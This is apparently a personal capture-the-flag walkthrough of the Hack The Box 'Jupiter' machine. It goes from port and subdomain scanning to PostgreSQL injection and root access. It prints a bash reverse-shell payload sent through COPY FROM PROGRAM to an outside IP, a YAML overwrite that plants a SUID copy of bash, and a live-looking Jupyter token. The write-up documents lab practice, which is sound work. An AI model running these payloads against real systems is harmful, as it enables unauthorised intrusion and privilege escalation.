nmap scanning --> port 22,80 is open.
--> add hosts to check the web page on port 80


email finded : support@jupiter.htb

by using wappalyzer to check--> the web page is using Nginx version 1.18.0

--> this contains some of vulnarable --> search this version then we can find some of thems useful --> might contains to connect port 22

--> scan by using ffuf or gobuster for subdomain

ffuf -u http://jupiter.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -c -fc 301 -H "Host: FUZZ.jupiter.htb"


got from scanning : [Status: 200, Size: 34390, Words: 2150, Lines: 212, Duration: 298ms]
    * FUZZ: kiosk

test on burpsuite we can see on /api/ds/querry contain maybe sql vuln --> try search postgres cmd execute 

check this to exploit and get shell : https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-command-execution

the web note have the cmd_exec show follow the payload all the things github let create it then  make a command to get shell

payload to get the shell : "COPY cmd_exec FROM PROGRAM 'bash -c  \"bash -i >& /dev/tcp/10.10.14.114/9001 0>&1\"';"

get shell 

--> import hold the shell : python3 -c 'import pty;pty.spawn("/bin/bash")'

stty raw -echo ;fg

upload pspy64 to see the process --> this indo might cool : /home/juno/.local/bin/shadow /dev/shm/network-simulation.yml 

that file can overwiten :

hosts:
  # a host with the hostname 'server'
  server:
    network_node_id: 0
    processes:
    - path: /usr/bin/cp
      args: /bin/bash /tmp/bash
      start_time: 3s
  # three hosts with hostnames 'client1', 'client2', and 'client3'
  client:
    network_node_id: 0
    quantity: 3
    processes:                                                
    - path: /usr/bin/chmod
      args: u+s /tmp/bash
      start_time: 5s    

 okay let move to /tmp to see juno 

http://127.0.0.1:8888/?token=d98a3de194f0615cef11a9c9b3c6072e815b002dfe5889e5

catch the reverse by python in that web 

need some edit the file config.json to get the root flag

on http:.... --> file:///root/root.txt --> edit the path to /tmp/tle.

get ROOT -> solved
